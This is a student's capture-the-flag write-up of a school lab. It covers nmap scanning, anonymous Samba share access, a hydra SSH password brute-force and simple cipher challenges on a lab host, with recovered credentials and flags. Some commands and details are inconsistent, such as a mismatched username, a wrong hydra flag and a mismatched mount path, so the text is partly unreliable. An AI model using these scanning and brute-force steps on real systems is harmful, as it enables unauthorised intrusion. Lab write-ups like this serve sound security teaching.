# CTF TELECOM Nancy 2024


![Static Badge](https://img.shields.io/badge/Télécom-Projet_scolaire-purple)    
![Static Badge](https://img.shields.io/badge/Networking-blue?logo=network)    

> [!CAUTION]
> This write-up deviates from the standard CTF workflow; instead, it follows a more intuitive, natural progression, and thus some flags might not be in the 'right' order

**Note**: This readme is also available in [french](nolink)   
**Note**: Don't like links? Me neither. They're all in the source code of this document. If, for some reason, you do not have it, simply check the end of the document

# Présentation

This document is my report for the Maxime Clementz's (PwC Luxembourg) CTF in TELECOM Nancy (2024)

## Ubuntu

### First flag

> Premier réflexe quand on découvre un LAN.
> Et puis ce sera l’occasion d’essayer CyberChef ensuite.

For the first flag, we're asked what are reflexes should be when connecting to a LAN. We therefore do a packet capture in order to check what's exchanged with connected machines. When opening the resulting `pcap file`, we can easily spot the flag in the data section: `flag1{Bien-joué}`
![screenshot first flag](https://github.com/cos-imo/TN_2024_CTF_report/blob/main/first_flag_wireshark.png)

### Second flag

> Maintenant que vous avez trouvé ma machine, vous devriez pouvoir trouver les services exposés.
> Ce flag peut être soumis tout en majuscules.

### Third flag

> Un autre service que t’avais peut-être pas encore vu ?

Until now we have only run basic nmap scans. Those display very few informations and only scan the 1000 most common ports. Let's now try to run a scan on all ports, and ask it to display :

``` 
$ sudo nmap -A -p- 10.0.0.20
[sudo] Mot de passe de kali :
Starting Nmap 7.93 (https://nmap.org ) at 2024-11-25 18:47 CET
Nmap scan report for 10.0.0.20
Host is up (0.00071s latency).
Not shown: 65533 closed tep ports (reset)
PORT      STATE     SERVICE      VERSION
445/tcp   open      netbios-ssn  Samba smbd 4.6.2
2221/tcp  open      ssh          (protocol 2.0)
|  fingerprint-strings:
|    NULL:
|_     SSH-2.0-flag3{v3rsiOn}Ubuntu-4ubuntu0.5
|  ssh-hostkey:
|    3072 67f47fed20cb9373a3b21dfd7e644c29 (RSA)
|    256 f864ae029c8b3dbd1b3fcfa05c9fd29a (ECDSA)
|_   256 4533ba12e8ed1eeed2bfb22ee1649191 (ED25519)
...
(Useless output has been truncated)
```

We can then spot the third flag in the version string: `flag3{v3rsiOn}`

### Fourth flag

> Une info complémentaire sur ma config de partage.

After discovering that samba runs on the Ubuntu machine, the next logical step is to take a look at all the availables shares:

```
$ smbclient -N -L 10.0.0.20
Sharename  Type  Comment
---------  ----  -------
print$     Disk  Printer Driver
samshare   Disk  Samba on ubuntu flag4{MoreInfoFromSMB!!}
```
We can now submit the flag: `flag4{MoreInfoFromSMB!!}`

### Fifth flag

> Tu le trouveras quand tu te seras enfin vraiment connecté sur un de mes services.

Now that we have enough informations about this Samba server, let's try to connect:
```
$ smbclient //10.0.0.20/sambashare
Password for [WORKGROUP\kali]:
try "help" to get a list of possible commands.
smb: \> ls
.                  D          0  Mon   Jan  16  23:51:30  2023
..                 D          0  Mon   Nov  25  09:47:49  2024
tail-sshd-config   N        320  Mon   Jan  16  23:51:01  2023
netstat.out        N        594  Mon   Jan  16  23:51:00  2023
passwords.dic      N     332586  Mon   Jan  16  23:51:01  2023
tail-sshd-config   N        320  Mon   Jan  16  23:51:01  2023
          19947120 blocks of size 1024. 11102060 blocks available

smb: \> get .flag.txt
getting file \.flag.txt of size 27 as .flag.txt (3,3 KiloBytes/sec) (average 3,3 KiloBytes/sec)
smb: \> exit

$ cat .flag.txt
flag5{BienvenueEtranger:)}
```

### Sixth flag

> (Mandatory) Suivre la consigne du message Secure SHell pour attaquer le service, mais ici le flag c’est le md5 de la liste de passwords candidats: 1 par ligne (sans ligne “vide” à la fin! ET candidats dans l’ordre alphabétique!!) puis format habituel: flag6{“résultat du hash md5”}.
PUIS attaquer avec hydra!

Just like the CTF Platform tells us, we try to connect to the server using `ssh`. The server then yields:



Ok, so let's follow its instruction!   
```
$ ssh -p 2221 10.0.0.20
** Hello moi-même **
Note pour plus tard, si jamais j'oublie mon mot de passe ...
Il se trouve dans passwords.dic ;) Attention si je les
essaie tous je risque de bloquer mon compte: s
Comme je suis pas mauvais avec grep, si je retire ceux
qui ne terminent pas par 'S' et qui n'ont pas de 'R',
il ne devrait en rester que 12 dans le dictionnaire fourni,
juste en dessous de la limite failban du serveur :D
Sinon je risque de me faire bannir mon IP ou même bloquer
 mon compte utilisateur sur le serveur!
Ensuite "online password attack" avec l'outil hydra par exemple.
kali@10.0.0.20's password:
```
It appears that we must order the passwords in `passwords.dic`. We can do so using the `-w` option of grep:

```
cat passwords.dic | grep -R 'R' | grep -v 'S$' >> out
```

But there are still more than 12 entries in the file. If we take a peek we can easily spot that some passwords are present multiple times; we can get rid of doublons using `sort -u`: 
```
cat out | sort -u >> passwords
```

And now, following the prompt, we use `hydra` to brute force the ssh server.  We already know the port and the username:
```
$ hydra -l stfpuser -P ~/passwords 10.0.0.20 ssh -5 2221
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway)
    
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-25 16:22:40   
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 22 login tries (l:1/p:22), ~2 tries per task   
[DATA] attacking ssh: //10.0.0.20:2221/   
[2221] [ssh] host: 10.0.0.20  login: sftpuser     password: 20TPR20TNS
1 of 1 target successfully completed, 1 valid password found    
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-11-25 16:22:46   
```
Now, to validate the challenge, we just have to calculate the md5 hash of the passwords:
```
cat passwords | md5sum
```

### Seventh flag

> Ça valait le coup de regarder.

Well, we've got a list of passwords... One of them must be a password for a challenge, right? We've noticed that flags are all in the form `flagN{VALUE}`. Let's check if we can find a string containing 'flag' in the file:

```
$ cat passwords.dic | grep flag
flag7{Ca_Vallait_Le_Coup_De_Regarder_Hein?}
```

### Eighth flag

> Le base64 du mot de passe trouvé par hydra est la clé AES (UTF-8) qui déchiffre (enchaînement de blocs) 3b0cbbc52e5fe058365d37cf8d3ab502a3ba6b7cc5cb8c8bcb79f9f140ad30de avec un IV nul.

So now, we only have to use cyberchef to encode the password (`20TPR20TNS`) in base64, then use it in the AES encryption:

![]

### Ninth flag

> Quoi faire de cette archive?

Now that we got the password to the sftp server, let's connect to it:
```
$ sftp -oPort=2221 sftpuser@10.0.0.20
<Message>
sftpuser@10.0.0.20 password:
Connected to 10.0.0.20
sftp > ls -al
drwxr-xr-x
drwxr-xr-x
-rw-

sftp> cd sFTP_SHARE
sftp> ls -al
.ChiffreJulius
Sujet_2023.zip
outils
sftp> exit
```

Ok, first let's take a look at the hidden file:
```
$ cat .ChiffreJulius
Yr zbg qr cnffr qr y'nepuvir rfg fhe y'nccyvpngvba jro ro clguba
synt9{Nir-Pnrfne!}
```

According to the last line, this isn't just some nonsense: that's clearly the 9th flag, encrypted. Using a tool (for instanve cyberchef, dcode...) and guessing that it's some Caesar encoding (since the filename's Julius), we easily get the flag.

### ???th flag

While we're connected to the sftp server, download the avilable files:
```
smb: \> ls
.                  D          0  Mon   Jan  16  23:51:30  2023
..                 D          0  Mon   Nov  25  09:47:49  2024
tail-sshd-config   N        320  Mon   Jan  16  23:51:01  2023
netstat.out        N        594  Mon   Jan  16  23:51:00  2023
passwords.dic      N     332586  Mon   Jan  16  23:51:01  2023
          19947120 blocks of size 1024. 11102060 blocks available

smb: \> get ./*
```

So we downloaded 3 files: an except of [ssh server config file](https://linux.die.net/man/1/ssh) (`tail-sshd-config`), the outcast of a [netstat](https://linux.die.net/man/8/netstat) command (`netstat.out`), and what appears to be a list of password (`passwords.dic`)

> [!NOTE]
> Here, since we were already connected, it was easier to use [sftp's `get` command](https://man7.org/linux/man-pages/man1/sftp.1.html), but we could simply have [mounted](https://man7.org/linux/man-pages/man8/mount.8.html) the samba share partition on our system:
> ```
> $ mkdir /mnt/samba
> $ sudo mount -t cifs -o username=kali //10.0.0.20/sambashare /tmp/samba
> ```
> Please note that doing so [is not recommended](https://en.wikipedia.org/wiki/Tunneling_protocol#Secure_Shell_tunneling)



 - ssh documentation on linux.die.net (there is a part about config files): https://linux.die.net/man/1/ssh
 - netstat documentation on linux.die.net: https://linux.die.net/man/8/netstat
 - sftp documentation on man7: https://man7.org/linux/man-pages/man1/sftp.1.html
 - mount documentation on man7: https://man7.org/linux/man-pages/man8/mount.8.html
